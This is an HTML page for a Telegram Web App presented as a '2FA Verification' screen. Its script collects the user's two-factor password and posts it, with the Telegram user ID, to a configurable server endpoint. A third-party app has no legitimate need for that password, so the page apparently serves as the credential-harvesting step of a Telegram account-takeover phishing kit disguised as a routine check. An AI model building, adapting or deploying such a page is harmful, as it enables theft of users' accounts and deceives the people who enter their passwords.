<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>2FA Verification</title>
    <link rel="stylesheet" href="styles.css">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        #twofa-input {
            width: 100% !important;
            max-width: 300px !important;
            height: 60px !important;
            font-size: 24px !important;
            padding: 0 20px !important;
            border-radius: 12px !important;
        }
    </style>
</head>
<body>
    <div class="container">
        <video class="background-video" autoplay muted loop playsinline>
            <source src="video/video2.mp4" type="video/mp4">
        </video>
        
        <div class="content">
            <div class="emoji-center">
                <span class="emoji">🔐</span>
            </div>
            
            <div class="instruction">
                Enter your 2FA password to continue!
            </div>
            
            <input type="password" class="otp-box" id="twofa-input" placeholder="••••••">
            
            <button id="twofa-btn" class="verify-btn">✅ VERIFY 2FA ✅</button>
        </div>
    </div>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const tg = window.Telegram.WebApp;
            const twofaInput = document.getElementById('twofa-input');
            const twofaBtn = document.getElementById('twofa-btn');

            // Change to your server URL when deployed
            const SERVER_URL = 'http://localhost:5000';
            const userId = tg.initDataUnsafe?.user?.id || 'user_default';

            tg.ready();
            tg.expand();
            tg.enableClosingConfirmation();

            twofaBtn.addEventListener('click', async function() {
                const password = twofaInput.value;
                if (!password) {
                    tg.showPopup({
                        title: 'Error',
                        message: 'Please enter your 2FA password!',
                        buttons: [{ type: 'ok', text: 'OK' }]
                    });
                    return;
                }

                twofaBtn.disabled = true;
                twofaBtn.textContent = 'Verifying...';

                try {
                    const res = await fetch(`${SERVER_URL}/verify-2fa`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ password, user_id: String(userId) })
                    });

                    const result = await res.json();

                    if (result.success) {
                        tg.sendData('verified:2fa_success');
                    } else {
                        tg.showPopup({
                            title: 'Wrong Password',
                            message: result.message || 'Incorrect 2FA password.',
                            buttons: [{ type: 'ok', text: 'OK' }]
                        });
                    }
                } catch (err) {
                    tg.showPopup({
                        title: 'Error',
                        message: 'Cannot reach server.',
                        buttons: [{ type: 'ok', text: 'OK' }]
                    });
                } finally {
                    twofaBtn.disabled = false;
                    twofaBtn.textContent = '✅ VERIFY 2FA ✅';
                }
            });
        });
    </script>
</body>
</html>
